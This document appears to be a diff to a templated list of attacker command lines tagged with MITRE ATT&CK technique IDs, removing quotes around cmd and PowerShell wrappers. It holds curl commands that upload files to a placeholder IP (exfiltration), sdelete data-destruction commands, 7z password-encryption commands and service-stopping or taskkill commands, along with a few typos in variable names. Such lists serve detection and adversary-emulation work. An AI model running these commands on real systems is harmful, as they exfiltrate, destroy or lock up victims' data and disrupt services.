 T1567 curl.exe -F 'file=@${source_file_path}' -X POST http://${ip_address}:${port}/upload
-T1567 cmd /c "curl.exe -F 'file=@${source_file_path}' -X POST http://${ip_address}:${port}/upload"
-T1567 powershell -c "curl.exe -F 'file=@${source_file_path}' -X POST http://${ip_address}:${port}/upload"
+T1567 cmd /c curl.exe -F 'file=@${source_file_path}' -X POST http://${ip_address}:${port}/upload
+T1567 powershell -c curl.exe -F 'file=@${source_file_path}' -X POST http://${ip_address}:${port}/upload
 T1567 curl -H -F 'file=@${source_file_path}' -X POST http://${ip_address}:${port}/upload
-T1567 cmd /c "curl -H -F 'file=@${source_file_path}' -X POST http://${ip_address}:${port}/upload"
-T1567 powershell -c "curl -H -F 'file=@${source_file_path}' -X POST http://${ip_address}:${port}/upload"
+T1567 cmd /c curl -H -F 'file=@${source_file_path}' -X POST http://${ip_address}:${port}/upload
+T1567 powershell -c curl -H -F 'file=@${source_file_path}' -X POST http://${ip_address}:${port}/upload
 T1567 curl.exe -H -F 'file=@${source_file_path}' -X POST http://${ip_address}:${port}/upload
-T1567 cmd /c "curl.exe -H -F 'file=@${source_file_path}' -X POST http://${ip_address}:${port}/upload"
-T1567 powershell -c "curl.exe -H -F 'file=@${source_file_path}' -X POST http://${ip_address}:${port}/upload"
+T1567 cmd /c curl.exe -H -F 'file=@${source_file_path}' -X POST http://${ip_address}:${port}/upload
+T1567 powershell -c curl.exe -H -F 'file=@${source_file_path}' -X POST http://${ip_address}:${port}/upload
 T1567 curl -X POST http://${ip_address}/upload -H -F files=@${source_file_path}
-T1567 cmd /c "curl -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
-T1567 powershell -c "curl -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
+T1567 cmd /c curl -X POST http://${ip_address}/upload -H -F files=@${source_file_path}
+T1567 powershell -c curl -X POST http://${ip_address}/upload -H -F files=@${source_file_path}
 T1567 curl.exe -X POST http://${ip_address}/upload -H -F files=@${source_file_path}
-T1567 cmd /c "curl.exe -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
-T1567 powershell -c "curl.exe -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
+T1567 cmd /c curl.exe -X POST http://${ip_address}/upload -H -F files=@${source_file_path}
+T1567 powershell -c curl.exe -X POST http://${ip_address}/upload -H -F files=@${source_file_path}
 T1567 curl -X POST http://${ip_address}/upload -F files=@${source_file_path}
-T1567 cmd /c "curl -X POST http://${ip_address}/upload -F files=@${source_file_path}"
-T1567 powershell -c "curl -X POST http://${ip_address}/upload -F files=@${source_file_path}"
+T1567 cmd /c curl -X POST http://${ip_address}/upload -F files=@${source_file_path}
+T1567 powershell -c curl -X POST http://${ip_address}/upload -F files=@${source_file_path}
 T1567 curl.exe -X POST http://${ip_address}/upload -F files=@${source_file_path}
-T1567 cmd /c "curl.exe -X POST http://${ip_address}/upload -F files=@${source_file_path}"
-T1567 powershell -c "curl.exe -X POST http://${ip_address}/upload -F files=@${source_file_path}"
+T1567 cmd /c curl.exe -X POST http://${ip_address}/upload -F files=@${source_file_path}
+T1567 powershell -c curl.exe -X POST http://${ip_address}/upload -F files=@${source_file_path}
 T1567 curl -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload
-T1567 cmd /c "curl -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload"
-T1567 powershell -c "curl -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload"
+T1567 cmd /c curl -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload
+T1567 powershell -c curl -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload
 T1567 curl.exe -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload
-T1567 cmd /c "curl.exe -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload"
-T1567 powershell -c "curl.exe -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload"
+T1567 cmd /c curl.exe -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload
+T1567 powershell -c curl.exe -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload
 T1567 curl -H -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload
-T1567 cmd /c "curl -H -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload"
-T1567 powershell -c "curl -H -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload"
+T1567 cmd /c curl -H -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload
+T1567 powershell -c curl -H -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload
 T1567 curl.exe -H -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload
-T1567 cmd /c "curl.exe -H -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload"
-T1567 powershell -c "curl.exe -H -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload"
+T1567 cmd /c curl.exe -H -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload
+T1567 powershell -c curl.exe -H -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload
 T1567 curl -X POST http://${ip_address}/upload -H -F files=@${source_file_path} -v
-T1567 cmd /c "curl -X POST http://${ip_address}/upload -H -F files=@${source_file_path} -v"
-T1567 powershell -c "curl -X POST http://${ip_address}/upload -H -F files=@${source_file_path} -v"
+T1567 cmd /c curl -X POST http://${ip_address}/upload -H -F files=@${source_file_path} -v
+T1567 powershell -c curl -X POST http://${ip_address}/upload -H -F files=@${source_file_path} -v
 T1567 curl.exe -X POST http://${ip_address}/upload -H -F files=@${source_file_path} -v
-T1567 cmd /c "curl.exe -X POST http://${ip_address}/upload -H -F files=@${source_file_path} -v"
-T1567 powershell -c "curl.exe -X POST http://${ip_address}/upload -H -F files=@${source_file_path} -v"
+T1567 cmd /c curl.exe -X POST http://${ip_address}/upload -H -F files=@${source_file_path} -v
+T1567 powershell -c curl.exe -X POST http://${ip_address}/upload -H -F files=@${source_file_path} -v
 T1567 curl -X POST http://${ip_address}/upload -F files=@${source_file_path} -v
-T1567 cmd /c "curl -X POST http://${ip_address}/upload -F files=@${source_file_path} -v"
-T1567 powershell -c "curl -X POST http://${ip_address}/upload -F files=@${source_file_path} -v"
+T1567 cmd /c curl -X POST http://${ip_address}/upload -F files=@${source_file_path} -v
+T1567 powershell -c curl -X POST http://${ip_address}/upload -F files=@${source_file_path} -v
 T1567 curl.exe -X POST http://${ip_address}/upload -F files=@${source_file_path} -v
-T1567 cmd /c "curl.exe -X POST http://${ip_address}/upload -F files=@${source_file_path} -v"
-T1567 powershell -c "curl.exe -X POST http://${ip_address}/upload -F files=@${source_file_path} -v"
+T1567 cmd /c curl.exe -X POST http://${ip_address}/upload -F files=@${source_file_path} -v
+T1567 powershell -c curl.exe -X POST http://${ip_address}/upload -F files=@${source_file_path} -v
 T1567 curl -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload -v
-T1567 cmd /c "curl -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload -v"
-T1567 powershell -c "curl -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload -v"
+T1567 cmd /c curl -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload -v
+T1567 powershell -c curl -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload -v
 T1567 curl.exe -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload -v
-T1567 cmd /c "curl.exe -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload -v"
-T1567 powershell -c "curl.exe -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload -v"
+T1567 cmd /c curl.exe -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload -v
+T1567 powershell -c curl.exe -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload -v
 T1567 curl -H -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload -v
-T1567 cmd /c "curl -H -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload -v"
-T1567 powershell -c "curl -H -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload -v"
+T1567 cmd /c curl -H -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload -v
+T1567 powershell -c curl -H -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload -v
 T1567 curl.exe -H -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload -v
-T1567 cmd /c "curl.exe -H -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload -v"
-T1567 powershell -c "curl.exe -H -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload -v"
+T1567 cmd /c curl.exe -H -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload -v
+T1567 powershell -c curl.exe -H -F file=@${source_file_path} -X POST http://${ip_address}:${port}/upload -v
 
 # T1485 Data Destruction
 T1485 sdelete ${local_file_path}
-T1485 cmd /c "sdelete ${local_file_path}"
-T1485 powershell -c "sdelete ${local_file_path}"
+T1485 cmd /c sdelete ${local_file_path}
+T1485 powershell -c sdelete ${local_file_path}
 T1485 sdelete.exe ${local_file_path}
-T1485 cmd /c "sdelete.exe ${local_file_path}"
-T1485 powershell -c "sdelete.exe ${local_file_path}"
+T1485 cmd /c sdelete.exe ${local_file_path}
+T1485 powershell -c sdelete.exe ${local_file_path}
 T1485 sdelete -accepteula ${local_file_path}
-T1485 cmd /c "sdelete -accepteula ${local_file_path}"
-T1485 powershell -c "sdelete -accepteula ${local_file_path}"
+T1485 cmd /c sdelete -accepteula ${local_file_path}
+T1485 powershell -c sdelete -accepteula ${local_file_path}
 T1485 sdelete.exe -accepteula ${local_file_path}
-T1485 cmd /c "sdelete.exe -accepteula ${local_file_path}"
-T1485 powershell -c "sdelete.exe -accepteula ${local_file_path}"
+T1485 cmd /c sdelete.exe -accepteula ${local_file_path}
+T1485 powershell -c sdelete.exe -accepteula ${local_file_path}
 T1485 sdelete -q ${local_file_path}
-T1485 cmd /c "sdelete -q ${loal_file_path}"
-T1485 powershell -c "sdelete -q ${local_file_path}"
+T1485 cmd /c sdelete -q ${loal_file_path}
+T1485 powershell -c sdelete -q ${local_file_path}
 T1485 sdelete.exe -q ${local_file_path}
-T1485 cmd /c "sdelete.exe -q ${local_file_path}"
-T1485 powershell -c "sdelete.exe -q ${local_file_path}"
+T1485 cmd /c sdelete.exe -q ${local_file_path}
+T1485 powershell -c sdelete.exe -q ${local_file_path}
 T1485 sdelete -q -accepteula ${local_file_path}
-T1485 cmd /c "sdelete -q -accepteula ${loal_file_path}"
-T1485 powershell -c "sdelete -q -accepteula ${local_file_path}"
+T1485 cmd /c sdelete -q -accepteula ${loal_file_path}
+T1485 powershell -c sdelete -q -accepteula ${local_file_path}
 T1485 sdelete.exe -q -accepteula ${local_file_path}
-T1485 cmd /c "sdelete.exe -q -accepteula ${local_file_path}"
-T1485 powershell -c "sdelete.exe -q -accepteula ${local_file_path}"
+T1485 cmd /c sdelete.exe -q -accepteula ${local_file_path}
+T1485 powershell -c sdelete.exe -q -accepteula ${local_file_path}
 T1485 sdelete -s ${local_file_path}
-T1485 cmd /c "sdelete -s ${local_file_path}"
-T1485 powershell -c "sdelete -s ${local_file_path}"
+T1485 cmd /c sdelete -s ${local_file_path}
+T1485 powershell -c sdelete -s ${local_file_path}
 T1485 sdelete.exe -s ${local_file_path}
-T1485 cmd /c "sdelete.exe -s ${local_file_path}"
-T1485 powershell -c "sdelete.exe -s ${local_file_path}"
+T1485 cmd /c sdelete.exe -s ${local_file_path}
+T1485 powershell -c sdelete.exe -s ${local_file_path}
 T1485 sdelete -s -accepteula ${local_file_path}
-T1485 cmd /c "sdelete -s -accepteula ${local_file_path}"
-T1485 powershell -c "sdelete -s -accepteula ${local_file_path}"
+T1485 cmd /c sdelete -s -accepteula ${local_file_path}
+T1485 powershell -c sdelete -s -accepteula ${local_file_path}
 T1485 sdelete.exe -s -accepteula ${local_file_path}
-T1485 cmd /c "sdelete.exe -s -accepteula ${local_file_path}"
-T1485 powershell -c "sdelete.exe -s -accepteula ${local_file_path}"
+T1485 cmd /c sdelete.exe -s -accepteula ${local_file_path}
+T1485 powershell -c sdelete.exe -s -accepteula ${local_file_path}
 T1485 sdelete -s -q ${local_file_path}
-T1485 cmd /c "sdelete -s -q ${loal_file_path}"
-T1485 powershell -c "sdelete -s -q ${local_file_path}"
+T1485 cmd /c sdelete -s -q ${loal_file_path}
+T1485 powershell -c sdelete -s -q ${local_file_path}
 T1485 sdelete.exe -s -q ${local_file_path}
-T1485 cmd /c "sdelete.exe -s -q ${local_file_path}"
-T1485 powershell -c "sdelete.exe -s -q ${local_file_path}"
+T1485 cmd /c sdelete.exe -s -q ${local_file_path}
+T1485 powershell -c sdelete.exe -s -q ${local_file_path}
 T1485 sdelete -s -q -accepteula ${local_file_path}
-T1485 cmd /c "sdelete -s -q -accepteula ${loal_file_path}"
-T1485 powershell -c "sdelete -s -q -accepteula ${local_file_path}"
+T1485 cmd /c sdelete -s -q -accepteula ${loal_file_path}
+T1485 powershell -c sdelete -s -q -accepteula ${local_file_path}
 T1485 sdelete.exe -s -q -accepteula ${local_file_path}
-T1485 cmd /c "sdelete.exe -s -q -accepteula ${local_file_path}"
-T1485 powershell -c "sdelete.exe -s -q -accepteula ${local_file_path}"
+T1485 cmd /c sdelete.exe -s -q -accepteula ${local_file_path}
+T1485 powershell -c sdelete.exe -s -q -accepteula ${local_file_path}
 T1485 sdelete -f ${local_file_path}
-T1485 cmd /c "sdelete -f ${local_file_path}"
-T1485 powershell -c "sdelete -f ${local_file_path}"
+T1485 cmd /c sdelete -f ${local_file_path}
+T1485 powershell -c sdelete -f ${local_file_path}
 T1485 sdelete.exe -f ${local_file_path}
-T1485 cmd /c "sdelete.exe -f ${local_file_path}"
-T1485 powershell -c "sdelete.exe -f ${local_file_path}"
+T1485 cmd /c sdelete.exe -f ${local_file_path}
+T1485 powershell -c sdelete.exe -f ${local_file_path}
 T1485 sdelete -f -accepteula ${local_file_path}
-T1485 cmd /c "sdelete -f -accepteula ${local_file_path}"
-T1485 powershell -c "sdelete -f -accepteula ${local_file_path}"
+T1485 cmd /c sdelete -f -accepteula ${local_file_path}
+T1485 powershell -c sdelete -f -accepteula ${local_file_path}
 T1485 sdelete.exe -f -accepteula ${local_file_path}
-T1485 cmd /c "sdelete.exe -f -accepteula ${local_file_path}"
-T1485 powershell -c "sdelete.exe -f -accepteula ${local_file_path}"
+T1485 cmd /c sdelete.exe -f -accepteula ${local_file_path}
+T1485 powershell -c sdelete.exe -f -accepteula ${local_file_path}
 T1485 sdelete -f -q ${local_file_path}
-T1485 cmd /c "sdelete -f -q ${loal_file_path}"
-T1485 powershell -c "sdelete -f -q ${local_file_path}"
+T1485 cmd /c sdelete -f -q ${loal_file_path}
+T1485 powershell -c sdelete -f -q ${local_file_path}
 T1485 sdelete.exe -f -q ${local_file_path}
-T1485 cmd /c "sdelete.exe -f -q ${local_file_path}"
-T1485 powershell -c "sdelete.exe -f -q ${local_file_path}"
+T1485 cmd /c sdelete.exe -f -q ${local_file_path}
+T1485 powershell -c sdelete.exe -f -q ${local_file_path}
 T1485 sdelete -f -q -accepteula ${local_file_path}
-T1485 cmd /c "sdelete -f -q -accepteula ${loal_file_path}"
-T1485 powershell -c "sdelete -f -q -accepteula ${local_file_path}"
+T1485 cmd /c sdelete -f -q -accepteula ${loal_file_path}
+T1485 powershell -c sdelete -f -q -accepteula ${local_file_path}
 T1485 sdelete.exe -f -q -accepteula ${local_file_path}
-T1485 cmd /c "sdelete.exe -f -q -accepteula ${local_file_path}"
-T1485 powershell -c "sdelete.exe -f -q -accepteula ${local_file_path}"
+T1485 cmd /c sdelete.exe -f -q -accepteula ${local_file_path}
+T1485 powershell -c sdelete.exe -f -q -accepteula ${local_file_path}
 
 # T1486 Data Encrypted for Impact
 T1486 7z a -p ${destination_file_path} ${source_file_path}
-T1486 cmd /c "7z a -p ${destination_file_path} ${source_file_path}"
-T1486 powershell -c "7z a -p ${destination_file_path} ${source_file_path}"
+T1486 cmd /c 7z a -p ${destination_file_path} ${source_file_path}
+T1486 powershell -c 7z a -p ${destination_file_path} ${source_file_path}
 T1486 7z.exe a -p ${destination_file_path} ${source_file_path}
-T1486 cmd /c "7z.exe a -p ${destination_file_path} ${source_file_path}"
-T1486 powershell -c "7z.exe a -p ${destination_file_path} ${source_file_path}"
+T1486 cmd /c 7z.exe a -p ${destination_file_path} ${source_file_path}
+T1486 powershell -c 7z.exe a -p ${destination_file_path} ${source_file_path}
 T1486 7z a ${destination_file_path} ${source_file_path} -p
-T1486 cmd /c "7z a ${destination_file_path} ${source_file_path} -p"
-T1486 powershell -c "7z a ${destination_file_path} ${source_file_path} -p"
+T1486 cmd /c 7z a ${destination_file_path} ${source_file_path} -p
+T1486 powershell -c 7z a ${destination_file_path} ${source_file_path} -p
 T1486 7z.exe a ${destination_file_path} ${source_file_path} -p
-T1486 cmd /c "7z.exe a ${destination_file_path} ${source_file_path} -p"
-T1486 powershell -c "7z.exe a ${destination_file_path} ${source_file_path} -p"
+T1486 cmd /c 7z.exe a ${destination_file_path} ${source_file_path} -p
+T1486 powershell -c 7z.exe a ${destination_file_path} ${source_file_path} -p
 T1486 7z a -p${password} ${destination_file_path} ${source_file_path}
-T1486 cmd /c "7z a -p${password} ${destination_file_path} ${source_file_path}"
-T1486 powershell -c "7z a -p${password} ${destination_file_path} ${source_file_path}"
+T1486 cmd /c 7z a -p${password} ${destination_file_path} ${source_file_path}
+T1486 powershell -c 7z a -p${password} ${destination_file_path} ${source_file_path}
 T1486 7z.exe a -p${password} ${destination_file_path} ${source_file_path}
-T1486 cmd /c "7z.exe a -p${password} ${destination_file_path} ${source_file_path}"
-T1486 powershell -c "7z.exe a -p${password} ${destination_file_path} ${source_file_path}"
+T1486 cmd /c 7z.exe a -p${password} ${destination_file_path} ${source_file_path}
+T1486 powershell -c 7z.exe a -p${password} ${destination_file_path} ${source_file_path}
 T1486 7z a ${destination_file_path} ${source_file_path} -p${password}
-T1486 cmd /c "7z a ${destination_file_path} ${source_file_path} -p${password}"
-T1486 powershell -c "7z a ${destination_file_path} ${source_file_path} -p${password}"
+T1486 cmd /c 7z a ${destination_file_path} ${source_file_path} -p${password}
+T1486 powershell -c 7z a ${destination_file_path} ${source_file_path} -p${password}
 T1486 7z.exe a ${destination_file_path} ${source_file_path} -p${password}
-T1486 cmd /c "7z.exe a ${destination_file_path} ${source_file_path} -p${password}"
-T1486 powershell -c "7z.exe a ${destination_file_path} ${source_file_path} -p${password}"
+T1486 cmd /c 7z.exe a ${destination_file_path} ${source_file_path} -p${password}
+T1486 powershell -c 7z.exe a ${destination_file_path} ${source_file_path} -p${password}
 T1486 7z a -slp -p ${destination_file_path} ${source_file_path}
-T1486 cmd /c "7z a -slp -p ${destination_file_path} ${source_file_path}"
-T1486 powershell -c "7z a -slp -p ${destination_file_path} ${source_file_path}"
+T1486 cmd /c 7z a -slp -p ${destination_file_path} ${source_file_path}
+T1486 powershell -c 7z a -slp -p ${destination_file_path} ${source_file_path}
 T1486 7z.exe a -slp -p ${destination_file_path} ${source_file_path}
-T1486 cmd /c "7z.exe a -slp -p ${destination_file_path} ${source_file_path}"
-T1486 powershell -c "7z.exe a -slp -p ${destination_file_path} ${source_file_path}"
+T1486 cmd /c 7z.exe a -slp -p ${destination_file_path} ${source_file_path}
+T1486 powershell -c 7z.exe a -slp -p ${destination_file_path} ${source_file_path}
 T1486 7z a -slp ${destination_file_path} ${source_file_path} -p
-T1486 cmd /c "7z a -slp ${destination_file_path} ${source_file_path} -p"
-T1486 powershell -c "7z a -slp ${destination_file_path} ${source_file_path} -p"
+T1486 cmd /c 7z a -slp ${destination_file_path} ${source_file_path} -p
+T1486 powershell -c 7z a -slp ${destination_file_path} ${source_file_path} -p
 T1486 7z.exe a -slp ${destination_file_path} ${source_file_path} -p
-T1486 cmd /c "7z.exe a -slp ${destination_file_path} ${source_file_path} -p"
-T1486 powershell -c "7z.exe a -slp ${destination_file_path} ${source_file_path} -p"
+T1486 cmd /c 7z.exe a -slp ${destination_file_path} ${source_file_path} -p
+T1486 powershell -c 7z.exe a -slp ${destination_file_path} ${source_file_path} -p
 T1486 7z a -slp -p${password} ${destination_file_path} ${source_file_path}
-T1486 cmd /c "7z a -slp -p${password} ${destination_file_path} ${source_file_path}"
-T1486 powershell -c "7z a -slp -p${password} ${destination_file_path} ${source_file_path}"
+T1486 cmd /c 7z a -slp -p${password} ${destination_file_path} ${source_file_path}
+T1486 powershell -c 7z a -slp -p${password} ${destination_file_path} ${source_file_path}
 T1486 7z.exe a -slp -p${password} ${destination_file_path} ${source_file_path}
-T1486 cmd /c "7z.exe a -slp -p${password} ${destination_file_path} ${source_file_path}"
-T1486 powershell -c "7z.exe a -slp -p${password} ${destination_file_path} ${source_file_path}"
+T1486 cmd /c 7z.exe a -slp -p${password} ${destination_file_path} ${source_file_path}
+T1486 powershell -c 7z.exe a -slp -p${password} ${destination_file_path} ${source_file_path}
 T1486 7z a -slp ${destination_file_path} ${source_file_path} -p${password}
-T1486 cmd /c "7z a -slp ${destination_file_path} ${source_file_path} -p${password}"
-T1486 powershell -c "7z a -slp ${destination_file_path} ${source_file_path} -p${password}"
+T1486 cmd /c 7z a -slp ${destination_file_path} ${source_file_path} -p${password}
+T1486 powershell -c 7z a -slp ${destination_file_path} ${source_file_path} -p${password}
 T1486 7z.exe a -slp ${destination_file_path} ${source_file_path} -p${password}
-T1486 cmd /c "7z.exe a -slp ${destination_file_path} ${source_file_path} -p${password}"
-T1486 powershell -c "7z.exe a -slp ${destination_file_path} ${source_file_path} -p${password}"
+T1486 cmd /c 7z.exe a -slp ${destination_file_path} ${source_file_path} -p${password}
+T1486 powershell -c 7z.exe a -slp ${destination_file_path} ${source_file_path} -p${password}
 T1486 7z a -slt -p ${destination_file_path} ${source_file_path}
-T1486 cmd /c "7z a -slt -p ${destination_file_path} ${source_file_path}"
-T1486 powershell -c "7z a -slt -p ${destination_file_path} ${source_file_path}"
+T1486 cmd /c 7z a -slt -p ${destination_file_path} ${source_file_path}
+T1486 powershell -c 7z a -slt -p ${destination_file_path} ${source_file_path}
 T1486 7z.exe a -slt -p ${destination_file_path} ${source_file_path}
-T1486 cmd /c "7z.exe a -slt -p ${destination_file_path} ${source_file_path}"
-T1486 powershell -c "7z.exe a -slt -p ${destination_file_path} ${source_file_path}"
+T1486 cmd /c 7z.exe a -slt -p ${destination_file_path} ${source_file_path}
+T1486 powershell -c 7z.exe a -slt -p ${destination_file_path} ${source_file_path}
 T1486 7z a -slt ${destination_file_path} ${source_file_path} -p
-T1486 cmd /c "7z a -slt ${destination_file_path} ${source_file_path} -p"
-T1486 powershell -c "7z a -slt ${destination_file_path} ${source_file_path} -p"
+T1486 cmd /c 7z a -slt ${destination_file_path} ${source_file_path} -p
+T1486 powershell -c 7z a -slt ${destination_file_path} ${source_file_path} -p
 T1486 7z.exe a -slt ${destination_file_path} ${source_file_path} -p
-T1486 cmd /c "7z.exe a -slt ${destination_file_path} ${source_file_path} -p"
-T1486 powershell -c "7z.exe a -slt ${destination_file_path} ${source_file_path} -p"
+T1486 cmd /c 7z.exe a -slt ${destination_file_path} ${source_file_path} -p
+T1486 powershell -c 7z.exe a -slt ${destination_file_path} ${source_file_path} -p
 T1486 7z a -slt -p${password} ${destination_file_path} ${source_file_path}
-T1486 cmd /c "7z a -slt -p${password} ${destination_file_path} ${source_file_path}"
-T1486 powershell -c "7z a -slt -p${password} ${destination_file_path} ${source_file_path}"
+T1486 cmd /c 7z a -slt -p${password} ${destination_file_path} ${source_file_path}
+T1486 powershell -c 7z a -slt -p${password} ${destination_file_path} ${source_file_path}
 T1486 7z.exe a -slt -p${password} ${destination_file_path} ${source_file_path}
-T1486 cmd /c "7z.exe a -slt -p${password} ${destination_file_path} ${source_file_path}"
-T1486 powershell -c "7z.exe a -slt -p${password} ${destination_file_path} ${source_file_path}"
+T1486 cmd /c 7z.exe a -slt -p${password} ${destination_file_path} ${source_file_path}
+T1486 powershell -c 7z.exe a -slt -p${password} ${destination_file_path} ${source_file_path}
 T1486 7z a -slt ${destination_file_path} ${source_file_path} -p${password}
-T1486 cmd /c "7z a -slt ${destination_file_path} ${source_file_path} -p${password}"
-T1486 powershell -c "7z a -slt ${destination_file_path} ${source_file_path} -p${password}"
+T1486 cmd /c 7z a -slt ${destination_file_path} ${source_file_path} -p${password}
+T1486 powershell -c 7z a -slt ${destination_file_path} ${source_file_path} -p${password}
 T1486 7z.exe a -slt ${destination_file_path} ${source_file_path} -p${password}
-T1486 cmd /c "7z.exe a -slt ${destination_file_path} ${source_file_path} -p${password}"
-T1486 powershell -c "7z.exe a -slt ${destination_file_path} ${source_file_path} -p${password}"
+T1486 cmd /c 7z.exe a -slt ${destination_file_path} ${source_file_path} -p${password}
+T1486 powershell -c 7z.exe a -slt ${destination_file_path} ${source_file_path} -p${password}
 
 # T1489 Service Stop
 T1489 sc stop ${service_name}
-T1489 cmd /c "sc stop ${service_name}"
-T1489 powershell -c "sc stop ${service_name}"
+T1489 cmd /c sc stop ${service_name}
+T1489 powershell -c sc stop ${service_name}
 T1489 sc.exe stop ${service_name}
-T1489 cmd /c "sc.exe stop ${service_name}"
-T1489 powershell -c "sc.exe stop ${service_name}"
+T1489 cmd /c sc.exe stop ${service_name}
+T1489 powershell -c sc.exe stop ${service_name}
 T1489 net stop ${service_name}
-T1489 cmd /c "net stop ${service_name}"
-T1489 powershell -c "net stop ${service_name}"
+T1489 cmd /c net stop ${service_name}
+T1489 powershell -c net stop ${service_name}
 T1489 net.exe stop ${service_name}
-T1489 cmd /c "net.exe stop ${service_name}"
-T1489 powershell -c "net.exe stop ${service_name}"
+T1489 cmd /c net.exe stop ${service_name}
+T1489 powershell -c net.exe stop ${service_name}
 T1489 taskkill /f /im ${process_name}
-T1489 cmd /c "taskkill /f /im ${process_name}"
-T1489 powershell -c "taskkill /f /im ${process_name}"
+T1489 cmd /c taskkill /f /im ${process_name}
+T1489 powershell -c taskkill /f /im ${process_name}
 T1489 taskkill.exe /f /im ${process_name}
-T1489 cmd /c "taskkill.exe /f /im ${process_name}"
-T1489 powershell -c "taskkill.exe /f /im ${process_name}"
+T1489 cmd /c taskkill.exe /f /im ${process_name}
+T1489 powershell -c taskkill.exe /f /im ${process_name}
 T1489 taskkill /im ${process_name}
-T1489 cmd /c "taskkill /im ${process_name}"
-T1489 powershell -c "taskkill /im ${process_name}"
+T1489 cmd /c taskkill /im ${process_name}
+T1489 powershell -c taskkill /im ${process_name}
 T1489 taskkill.exe /im ${process_name}
-T1489 cmd /c "taskkill.exe /im ${process_name}"
-T1489 powershell -c "taskkill.exe /im ${process_name}"
+T1489 cmd /c taskkill.exe /im ${process_name}
+T1489 powershell -c taskkill.exe /im ${process_name}
 T1489 taskkill /f /im ${process_name} /T
-T1489 cmd /c "taskkill /f /im ${process_name} /T"
-T1489 powershell -c "taskkill /f /im ${process_name} /T"
+T1489 cmd /c taskkill /f /im ${process_name} /T
+T1489 powershell -c taskkill /f /im ${process_name} /T
 T1489 taskkill.exe /f /im ${process_name} /T
-T1489 cmd /c "taskkill.exe /f /im ${process_name} /T"
-T1489 powershell -c "taskkill.exe /f /im ${process_name} /T"
+T1489 cmd /c taskkill.exe /f /im ${process_name} /T
+T1489 powershell -c taskkill.exe /f /im ${process_name} /T
 T1489 taskkill /im ${process_name} /T
-T1489 cmd /c "taskkill /im ${process_name} /T"
-T1489 powershell -c "taskkill /im ${process_name} /T"
+T1489 cmd /c taskkill /im ${process_name} /T
+T1489 powershell -c taskkill /im ${process_name} /T
 T1489 taskkill.exe /im ${process_name} /T
-T1489 cmd /c "taskkill.exe /im ${process_name} /T"
-T1489 powershell -c "taskkill.exe /im ${process_name} /T"
+T1489 cmd /c taskkill.exe /im ${process_name} /T
+T1489 powershell -c taskkill.exe /im ${process_name} /T
 T1489 taskkill /F /im ${process_name}
-T1489 cmd /c "taskkill /F /im ${process_name}"
-T1489 powershell -c "taskkill /F /im ${process_name}"
+T1489 cmd /c taskkill /F /im ${process_name}
+T1489 powershell -c taskkill /F /im ${process_name}
 T1489 taskkill.exe /F /im ${process_name}
-T1489 cmd /c "taskkill.exe /F /im ${process_name}"
-T1489 powershell -c "taskkill.exe /F /im ${process_name}"
+T1489 cmd /c taskkill.exe /F /im ${process_name}
+T1489 powershell -c taskkill.exe /F /im ${process_name}
 T1489 taskkill /F /im ${process_name} /T
-T1489 cmd /c "taskkill /F /im ${process_name} /T"
-T1489 powershell -c "taskkill /F /im ${process_name} /T"
+T1489 cmd /c taskkill /F /im ${process_name} /T
+T1489 powershell -c taskkill /F /im ${process_name} /T
 T1489 taskkill.exe /F /im ${process_name} /T
-T1489 cmd /c "taskkill.exe /F /im ${process_name} /T"
-T1489 powershell -c "taskkill.exe /F /im ${process_name} /T"
+T1489 cmd /c taskkill.exe /F /im ${process_name} /T
+T1489 powershell -c taskkill.exe /F /im ${process_name} /T
 T1489 taskkill /F /IM ${process_name}
-T1489 cmd /c "taskkill /F /IM ${process_name}"
-T1489 powershell -c "taskkill /F /IM ${process_name}"
+T1489 cmd /c taskkill /F /IM ${process_name}
+T1489 powershell -c taskkill /F /IM ${process_name}
 T1489 taskkill.exe /F /IM ${process_name}
-T1489 cmd /c "taskkill.exe /F /IM ${process_name}"
-T1489 powershell -c "taskkill.exe /F /IM ${process_name}"
+T1489 cmd /c taskkill.exe /F /IM ${process_name}
+T1489 powershell -c taskkill.exe /F /IM ${process_name}
 T1489 taskkill /F /IM ${process_name} /T
-T1489 cmd /c "taskkill /F /IM ${process_name} /T"
-T1489 powershell -c "taskkill /F /IM ${process_name} /T"
+T1489 cmd /c taskkill /F /IM ${process_name} /T
+T1489 powershell -c taskkill /F /IM ${process_name} /T
 T1489 taskkill.exe /F /IM ${process_name} /T
